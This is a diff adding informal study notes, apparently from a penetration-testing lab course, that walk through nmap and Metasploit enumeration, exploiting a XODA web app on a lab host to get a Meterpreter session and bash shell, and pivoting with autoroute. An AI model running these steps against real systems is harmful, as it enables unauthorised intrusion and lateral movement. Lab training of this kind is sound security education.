@@ -6,3 +6,95 @@ db_status
 db_import
 hosts // to see the hosts
 services //to see the services
+
+Service Enumeration:
+.Scan for the open ports and services running in the windows or linux
+sometimes rdp,smb will be open and we will get to info as much as possible like account names,share after the host discovery and network scanning.
+
+.Enumeration we do 
+Service Enumeration
+User Enumeration
+Share Enumeration
+
+
+*service enumeration: 
+in Service enumeration we enumerate services,open ports,os version
+-sV -O -Pn
+-sV = service Version
+-O = OS Version
+-Pn = probing if the host is blocking the pings (-pn will do assume the host is up and directly will do the scanning)
+
+we can also  do nmap scan in msf console
+msfconsole
+msf6 > workspace -a nmap_msf //create workspace
+[*] Added workspace: nmap_msf
+[*] Workspace: nmap_msf
+msf6 > db_nmap -Pn -sV -O demo.ine.local //no need to save msf will save in the database.
+msf6> hosts //will give hosts
+msf6> services //will give services
+msf6> vulns //will give what are the vulns
+
+Port Scanning with auxiliary Modules
+
+what is auxiliary module? 
+scanning,discover, and fuzzing
+to perform both tcp & UDP port scanning as like FTP,SSH,SMB etc..,
+it doesnt involve in exploitation they just allows us to extract information.
+they also used in post exploitation phase.
+
+postgresql
+msfconsole 
+db_status
+now in msfconsole: search portscan
+it will give you portscan selected tcp //instead of nmap
+Use <past the auxilary serial no5 or full name)
+show options will show the options and 
+set Rhosts <target ip/domain>
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+[+] 192.120.71.3:         - 192.120.71.3:80 - TCP OPEN
+[*] 192.120.71.3:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+Here we can see port 80 is open so 
+lets use curl command curl domain it using xoda
+
+for searching xoda exploit
+msf6 > search xoda
+copy the exploit use and change the RHOSTS with target ip or domain
+and set TARGETURI / coz we using port 80 so root only
+next set LHOSTS is our ip address
+sometimes show targets
+set Targets <Target number>
+then exploit
+we have a meterpreter
+ctl+L to clear history
+and take the shell using shell command
+meterpreter > shell
+Process 801 created.
+Channel 0 created.
+/bin/bash -i
+bash: cannot set terminal process group (433): Inappropriate ioctl for device
+bash: no job control in this shell
+target ip:192.189.244.2
+so victim ip in that range 
+so come to meterpreter
+ctrl +c & Y
+run autoroute -s <ip of that target machine>
+
+meterpreter > run autoroute -s 192.189.244.2
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.189.244.2/255.255.255.0...
+[+] Added route to 192.189.244.2/255.255.255.0 via 192.120.71.3
+[*] Use the -p option to list all active routes
+meterpreter > background
+[*] Backgrounding session 1...
+sessions you will get sessions
+
+sessions -i <number> you will interact with the sessions
+
+
+
+
